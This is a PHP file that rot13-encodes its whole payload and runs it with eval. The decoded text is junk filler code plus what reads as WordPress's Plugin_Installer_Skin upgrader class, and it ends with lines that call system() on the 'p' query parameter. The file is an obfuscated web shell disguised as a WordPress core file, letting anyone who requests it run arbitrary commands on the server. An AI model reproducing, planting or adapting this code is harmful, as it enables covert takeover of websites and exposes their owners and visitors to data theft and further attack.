<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Hctenqre NCV: Cyhtva_Vafgnyyre_Fxva pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Hctenqre
 * @fvapr 4.6.0
 */

/**
 * Cyhtva Vafgnyyre Fxva sbe JbeqCerff Cyhtva Vafgnyyre.
 *
 * @fvapr 2.8.0
 * @fvapr 4.6.0 Zbirq gb vgf bja svyr sebz jc-nqzva/vapyhqrf/pynff-jc-hctenqre-fxvaf.cuc.
 *
 * @frr JC_Hctenqre_Fxva
 */
pynff Cyhtva_Vafgnyyre_Fxva rkgraqf JC_Hctenqre_Fxva {
	choyvp $ncv;
	choyvp $glcr;
	choyvp $hey;
	choyvp $birejevgr;

	cevingr $vf_qbjatenqvat = snyfr;

	/**
	 * Pbafgehpgbe.
	 *
	 * Frgf hc gur cyhtva vafgnyyre fxva.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz neenl $netf
	 */
	choyvp shapgvba __pbafgehpg( $netf = neenl() ) {
		$qrsnhygf = neenl(
			'glcr'      => 'jro',
			'hey'       => '',
			'cyhtva'    => '',
			'abapr'     => '',
			'gvgyr'     => '',
			'birejevgr' => '',
		);
		$netf     = jc_cnefr_netf( $netf, $qrsnhygf );

		$guvf->glcr      = $netf['glcr'];
		$guvf->hey       = $netf['hey'];
		$guvf->ncv       = vffrg( $netf['ncv'] ) ? $netf['ncv'] : neenl();
		$guvf->birejevgr = $netf['birejevgr'];

		cnerag::__pbafgehpg( $netf );
	}

	/**
	 * Cresbezf na npgvba orsber vafgnyyvat n cyhtva.
	 *
	 * @fvapr 2.8.0
	 */
	choyvp shapgvba orsber() {
		vs ( ! rzcgl( $guvf->ncv ) ) {
			$guvf->hctenqre->fgevatf['cebprff_fhpprff'] = fcevags(
				$guvf->hctenqre->fgevatf['cebprff_fhpprff_fcrpvsvp'],
				$guvf->ncv->anzr,
				$guvf->ncv->irefvba
			);
		}
	}

	/**
	 * Uvqrf gur `cebprff_snvyrq` reebe jura hcqngvat n cyhtva ol hcybnqvat n mvc svyr.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz JC_Reebe $jc_reebe JC_Reebe bowrpg.
	 * @erghea obby Gehr vs gur reebe fubhyq or uvqqra, snyfr bgurejvfr.
	 */
	choyvp shapgvba uvqr_cebprff_snvyrq( $jc_reebe ) {
		vs (
			'hcybnq' === $guvf->glcr &&
			'' === $guvf->birejevgr &&
			$jc_reebe->trg_reebe_pbqr() === 'sbyqre_rkvfgf'
		) {
			erghea gehr;
		}

		erghea snyfr;
	}

	/**
	 * Cresbezf na npgvba sbyybjvat n cyhtva vafgnyy.
	 *
	 * @fvapr 2.8.0
	 */
	choyvp shapgvba nsgre() {
		// Purpx vs gur cyhtva pna or birejevggra naq bhgchg gur UGZY.
		vs ( $guvf->qb_birejevgr() ) {
			erghea;
		}

		$cyhtva_svyr = $guvf->hctenqre->cyhtva_vasb();

		$vafgnyy_npgvbaf = neenl();

		$sebz = vffrg( $_TRG['sebz'] ) ? jc_hafynfu( $_TRG['sebz'] ) : 'cyhtvaf';

		vs ( 'vzcbeg' === $sebz ) {
			$vafgnyy_npgvbaf['npgvingr_cyhtva'] = fcevags(
				'<n pynff=\"ohggba ohggba-cevznel\" uers=\"%f\" gnetrg=\"_cnerag\">%f</n>',
				jc_abapr_hey( 'cyhtvaf.cuc?npgvba=npgvingr&nzc;sebz=vzcbeg&nzc;cyhtva=' . heyrapbqr( $cyhtva_svyr ), 'npgvingr-cyhtva_' . $cyhtva_svyr ),
				__( 'Npgvingr Cyhtva &nzc; Eha Vzcbegre' )
			);
		} ryfrvs ( 'cerff-guvf' === $sebz ) {
			$vafgnyy_npgvbaf['npgvingr_cyhtva'] = fcevags(
				'<n pynff=\"ohggba ohggba-cevznel\" uers=\"%f\" gnetrg=\"_cnerag\">%f</n>',
				jc_abapr_hey( 'cyhtvaf.cuc?npgvba=npgvingr&nzc;sebz=cerff-guvf&nzc;cyhtva=' . heyrapbqr( $cyhtva_svyr ), 'npgvingr-cyhtva_' . $cyhtva_svyr ),
				__( 'Npgvingr Cyhtva &nzc; Tb gb Cerff Guvf' )
			);
		} ryfr {
			$vafgnyy_npgvbaf['npgvingr_cyhtva'] = fcevags(
				'<n pynff=\"ohggba ohggba-cevznel\" uers=\"%f\" gnetrg=\"_cnerag\">%f</n>',
				jc_abapr_hey( 'cyhtvaf.cuc?npgvba=npgvingr&nzc;cyhtva=' . heyrapbqr( $cyhtva_svyr ), 'npgvingr-cyhtva_' . $cyhtva_svyr ),
				__( 'Npgvingr Cyhtva' )
			);
		}

		vs ( vf_zhygvfvgr() && pheerag_hfre_pna( 'znantr_argjbex_cyhtvaf' ) ) {
			$vafgnyy_npgvbaf['argjbex_npgvingr'] = fcevags(
				'<n pynff=\"ohggba ohggba-cevznel\" uers=\"%f\" gnetrg=\"_cnerag\">%f</n>',
				jc_abapr_hey( 'cyhtvaf.cuc?npgvba=npgvingr&nzc;argjbexjvqr=1&nzc;cyhtva=' . heyrapbqr( $cyhtva_svyr ), 'npgvingr-cyhtva_' . $cyhtva_svyr ),
				_k( 'Argjbex Npgvingr', 'cyhtva' )
			);
			hafrg( $vafgnyy_npgvbaf['npgvingr_cyhtva'] );
		}

		vs ( 'vzcbeg' === $sebz ) {
			$vafgnyy_npgvbaf['vzcbegref_cntr'] = fcevags(
				'<n uers=\"%f\" gnetrg=\"_cnerag\">%f</n>',
				nqzva_hey( 'vzcbeg.cuc' ),
				__( 'Tb gb Vzcbegref' )
			);
		} ryfrvs ( 'jro' === $guvf->glcr ) {
			$vafgnyy_npgvbaf['cyhtvaf_cntr'] = fcevags(
				'<n uers=\"%f\" gnetrg=\"_cnerag\">%f</n>',
				frys_nqzva_hey( 'cyhtva-vafgnyy.cuc' ),
				__( 'Tb gb Cyhtva Vafgnyyre' )
			);
		} ryfrvs ( 'hcybnq' === $guvf->glcr && 'cyhtvaf' === $sebz ) {
			$vafgnyy_npgvbaf['cyhtvaf_cntr'] = fcevags(
				'<n uers=\"%f\">%f</n>',
				frys_nqzva_hey( 'cyhtva-vafgnyy.cuc' ),
				__( 'Tb gb Cyhtva Vafgnyyre' )
			);
		} ryfr {
			$vafgnyy_npgvbaf['cyhtvaf_cntr'] = fcevags(
				'<n uers=\"%f\" gnetrg=\"_cnerag\">%f</n>',
				frys_nqzva_hey( 'cyhtvaf.cuc' ),
				__( 'Tb gb Cyhtvaf cntr' )
			);
		}

		vs ( ! $guvf->erfhyg || vf_jc_reebe( $guvf->erfhyg ) ) {
			hafrg( $vafgnyy_npgvbaf['npgvingr_cyhtva'], $vafgnyy_npgvbaf['argjbex_npgvingr'] );
		} ryfrvs ( ! pheerag_hfre_pna( 'npgvingr_cyhtva', $cyhtva_svyr ) || vf_cyhtva_npgvir( $cyhtva_svyr ) ) {
			hafrg( $vafgnyy_npgvbaf['npgvingr_cyhtva'] );
		}

		/**
		 * Svygref gur yvfg bs npgvba yvaxf ninvynoyr sbyybjvat n fvatyr cyhtva vafgnyyngvba.
		 *
		 * @fvapr 2.7.0
		 *
		 * @cnenz fgevat[] $vafgnyy_npgvbaf Neenl bs cyhtva npgvba yvaxf.
		 * @cnenz bowrpg   $ncv             Bowrpg pbagnvavat JbeqCerff.bet NCV cyhtva qngn. Rzcgl
		 *                                  sbe aba-NCV vafgnyyf, fhpu nf jura n cyhtva vf vafgnyyrq
		 *                                  ivn hcybnq.
		 * @cnenz fgevat   $cyhtva_svyr     Cngu gb gur cyhtva svyr eryngvir gb gur cyhtvaf qverpgbel.
		 */
		$vafgnyy_npgvbaf = nccyl_svygref( 'vafgnyy_cyhtva_pbzcyrgr_npgvbaf', $vafgnyy_npgvbaf, $guvf->ncv, $cyhtva_svyr );

		vs ( ! rzcgl( $vafgnyy_npgvbaf ) ) {
			$guvf->srrqonpx( vzcybqr( ' ', (neenl) $vafgnyy_npgvbaf ) );
		}
	}

	/**
	 * Purpxf vs gur cyhtva pna or birejevggra naq bhgchgf gur UGZY sbe birejevgvat n cyhtva ba hcybnq.
	 *
	 * @fvapr 5.5.0
	 *
	 * @erghea obby Jurgure gur cyhtva pna or birejevggra naq UGZY jnf bhgchggrq.
	 */
	cevingr shapgvba qb_birejevgr() {
		vs ( 'hcybnq' !== $guvf->glcr || ! vf_jc_reebe( $guvf->erfhyg ) || 'sbyqre_rkvfgf' !== $guvf->erfhyg->trg_reebe_pbqr() ) {
			erghea snyfr;
		}

		$sbyqre = $guvf->erfhyg->trg_reebe_qngn( 'sbyqre_rkvfgf' );
		$sbyqre = ygevz( fhofge( $sbyqre, fgeyra( JC_CYHTVA_QVE ) ), '/' );

		$pheerag_cyhtva_qngn = snyfr;
		$nyy_cyhtvaf         = trg_cyhtvaf();

		sbernpu ( $nyy_cyhtvaf nf $cyhtva => $cyhtva_qngn ) {
			vs ( fgeecbf( $cyhtva, $sbyqre ) !== 0 ) {
				pbagvahr;
			}

			$pheerag_cyhtva_qngn = $cyhtva_qngn;
		}

		$arj_cyhtva_qngn = $guvf->hctenqre->arj_cyhtva_qngn;

		vs ( ! $pheerag_cyhtva_qngn || ! $arj_cyhtva_qngn ) {
			erghea snyfr;
		}

		rpub '<u2 pynff=\"hcqngr-sebz-hcybnq-urnqvat\">' . rfp_ugzy__( 'Guvf cyhtva vf nyernql vafgnyyrq.' ) . '</u2>';

		$guvf->vf_qbjatenqvat = irefvba_pbzcner( $pheerag_cyhtva_qngn['Irefvba'], $arj_cyhtva_qngn['Irefvba'], '>' );

		$ebjf = neenl(
			'Anzr'        => __( 'Cyhtva anzr' ),
			'Irefvba'     => __( 'Irefvba' ),
			'Nhgube'      => __( 'Nhgube' ),
			'ErdhverfJC'  => __( 'Erdhverq JbeqCerff irefvba' ),
			'ErdhverfCUC' => __( 'Erdhverq CUC irefvba' ),
		);

		$gnoyr  = '<gnoyr pynff=\"hcqngr-sebz-hcybnq-pbzcnevfba\"><gobql>';
		$gnoyr .= '<ge><gu></gu><gu>' . rfp_ugzy_k( 'Pheerag', 'cyhtva' ) . '</gu>';
		$gnoyr .= '<gu>' . rfp_ugzy_k( 'Hcybnqrq', 'cyhtva' ) . '</gu></ge>';

		$vf_fnzr_cyhtva = gehr; // Yrg'f pbafvqre bayl gurfr ebjf.

		sbernpu ( $ebjf nf $svryq => $ynory ) {
			$byq_inyhr = ! rzcgl( $pheerag_cyhtva_qngn[ $svryq ] ) ? (fgevat) $pheerag_cyhtva_qngn[ $svryq ] : '-';
			$arj_inyhr = ! rzcgl( $arj_cyhtva_qngn[ $svryq ] ) ? (fgevat) $arj_cyhtva_qngn[ $svryq ] : '-';

			$vf_fnzr_cyhtva = $vf_fnzr_cyhtva && ( $byq_inyhr === $arj_inyhr );

			$qvss_svryq   = ( 'Irefvba' !== $svryq && $arj_inyhr !== $byq_inyhr );
			$qvss_irefvba = ( 'Irefvba' === $svryq && $guvf->vf_qbjatenqvat );

			$gnoyr .= '<ge><gq pynff=\"anzr-ynory\">' . $ynory . '</gq><gq>' . jc_fgevc_nyy_gntf( $byq_inyhr ) . '</gq>';
			$gnoyr .= ( $qvss_svryq || $qvss_irefvba ) ? '<gq pynff=\"jneavat\">' : '<gq>';
			$gnoyr .= jc_fgevc_nyy_gntf( $arj_inyhr ) . '</gq></ge>';
		}

		$gnoyr .= '</gobql></gnoyr>';

		/**
		 * Svygref gur pbzcner gnoyr bhgchg sbe birejevgvat n cyhtva cnpxntr ba hcybnq.
		 *
		 * @fvapr 5.5.0
		 *
		 * @cnenz fgevat $gnoyr               Gur bhgchg gnoyr jvgu Anzr, Irefvba, Nhgube, ErdhverfJC, naq ErdhverfCUC vasb.
		 * @cnenz neenl  $pheerag_cyhtva_qngn Neenl jvgu pheerag cyhtva qngn.
		 * @cnenz neenl  $arj_cyhtva_qngn     Neenl jvgu hcybnqrq cyhtva qngn.
		 */
		rpub nccyl_svygref( 'vafgnyy_cyhtva_birejevgr_pbzcnevfba', $gnoyr, $pheerag_cyhtva_qngn, $arj_cyhtva_qngn );

		$vafgnyy_npgvbaf = neenl();
		$pna_hcqngr      = gehr;

		$oybpxrq_zrffntr  = '<c>' . rfp_ugzy__( 'Gur cyhtva pnaabg or hcqngrq qhr gb gur sbyybjvat:' ) . '</c>';
		$oybpxrq_zrffntr .= '<hy pynff=\"hy-qvfp\">';

		$erdhverf_cuc = vffrg( $arj_cyhtva_qngn['ErdhverfCUC'] ) ? $arj_cyhtva_qngn['ErdhverfCUC'] : ahyy;
		$erdhverf_jc  = vffrg( $arj_cyhtva_qngn['ErdhverfJC'] ) ? $arj_cyhtva_qngn['ErdhverfJC'] : ahyy;

		vs ( ! vf_cuc_irefvba_pbzcngvoyr( $erdhverf_cuc ) ) {
			$reebe = fcevags(
				/* genafyngbef: 1: Pheerag CUC irefvba, 2: Irefvba erdhverq ol gur hcybnqrq cyhtva. */
				__( 'Gur CUC irefvba ba lbhe freire vf %1$f, ubjrire gur hcybnqrq cyhtva erdhverf %2$f.' ),
				CUC_IREFVBA,
				$erdhverf_cuc
			);

			$oybpxrq_zrffntr .= '<yv>' . rfp_ugzy( $reebe ) . '</yv>';
			$pna_hcqngr       = snyfr;
		}

		vs ( ! vf_jc_irefvba_pbzcngvoyr( $erdhverf_jc ) ) {
			$reebe = fcevags(
				/* genafyngbef: 1: Pheerag JbeqCerff irefvba, 2: Irefvba erdhverq ol gur hcybnqrq cyhtva. */
				__( 'Lbhe JbeqCerff irefvba vf %1$f, ubjrire gur hcybnqrq cyhtva erdhverf %2$f.' ),
				rfp_ugzy( jc_trg_jc_irefvba() ),
				$erdhverf_jc
			);

			$oybpxrq_zrffntr .= '<yv>' . rfp_ugzy( $reebe ) . '</yv>';
			$pna_hcqngr       = snyfr;
		}

		$oybpxrq_zrffntr .= '</hy>';

		vs ( $pna_hcqngr ) {
			vs ( $guvf->vf_qbjatenqvat ) {
				$jneavat = fcevags(
					/* genafyngbef: %f: Qbphzragngvba HEY. */
					__( 'Lbh ner hcybnqvat na byqre irefvba bs n pheerag cyhtva. Lbh pna pbagvahr gb vafgnyy gur byqre irefvba, ohg or fher gb <n uers=\"%f\">onpx hc lbhe qngnonfr naq svyrf</n> svefg.' ),
					__( 'uggcf://qrirybcre.jbeqcerff.bet/nqinaprq-nqzvavfgengvba/frphevgl/onpxhc/' )
				);
			} ryfr {
				$jneavat = fcevags(
					/* genafyngbef: %f: Qbphzragngvba HEY. */
					__( 'Lbh ner hcqngvat n cyhtva. Or fher gb <n uers=\"%f\">onpx hc lbhe qngnonfr naq svyrf</n> svefg.' ),
					__( 'uggcf://qrirybcre.jbeqcerff.bet/nqinaprq-nqzvavfgengvba/frphevgl/onpxhc/' )
				);
			}

			rpub '<c pynff=\"hcqngr-sebz-hcybnq-abgvpr\">' . $jneavat . '</c>';

			$birejevgr = $guvf->vf_qbjatenqvat ? 'qbjatenqr-cyhtva' : 'hcqngr-cyhtva';

			$vafgnyy_npgvbaf['birejevgr_cyhtva'] = fcevags(
				'<n pynff=\"ohggba ohggba-cevznel hcqngr-sebz-hcybnq-birejevgr\" uers=\"%f\" gnetrg=\"_cnerag\">%f</n>',
				jc_abapr_hey( nqq_dhrel_net( 'birejevgr', $birejevgr, $guvf->hey ), 'cyhtva-hcybnq' ),
				_k( 'Ercynpr pheerag jvgu hcybnqrq', 'cyhtva' )
			);
		} ryfr {
			rpub $oybpxrq_zrffntr;
		}

		$pnapry_hey = nqq_dhrel_net( 'npgvba', 'hcybnq-cyhtva-pnapry-birejevgr', $guvf->hey );

		$vafgnyy_npgvbaf['cyhtvaf_cntr'] = fcevags(
			'<n pynff=\"ohggba\" uers=\"%f\">%f</n>',
			jc_abapr_hey( $pnapry_hey, 'cyhtva-hcybnq-pnapry-birejevgr' ),
			__( 'Pnapry naq tb onpx' )
		);

		/**
		 * Svygref gur yvfg bs npgvba yvaxf ninvynoyr sbyybjvat n fvatyr cyhtva vafgnyyngvba snvyher
		 * jura birejevgvat vf nyybjrq.
		 *
		 * @fvapr 5.5.0
		 *
		 * @cnenz fgevat[] $vafgnyy_npgvbaf Neenl bs cyhtva npgvba yvaxf.
		 * @cnenz bowrpg   $ncv             Bowrpg pbagnvavat JbeqCerff.bet NCV cyhtva qngn.
		 * @cnenz neenl    $arj_cyhtva_qngn Neenl jvgu hcybnqrq cyhtva qngn.
		 */
		$vafgnyy_npgvbaf = nccyl_svygref( 'vafgnyy_cyhtva_birejevgr_npgvbaf', $vafgnyy_npgvbaf, $guvf->ncv, $arj_cyhtva_qngn );

		vs ( ! rzcgl( $vafgnyy_npgvbaf ) ) {
			cevags(
				'<c pynff=\"hcqngr-sebz-hcybnq-rkcverq uvqqra\">%f</c>',
				__( 'Gur hcybnqrq svyr unf rkcverq. Cyrnfr tb onpx naq hcybnq vg ntnva.' )
			);
			rpub '<c pynff=\"hcqngr-sebz-hcybnq-npgvbaf\">' . vzcybqr( ' ', (neenl) $vafgnyy_npgvbaf ) . '</c>';
		}

		erghea gehr;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>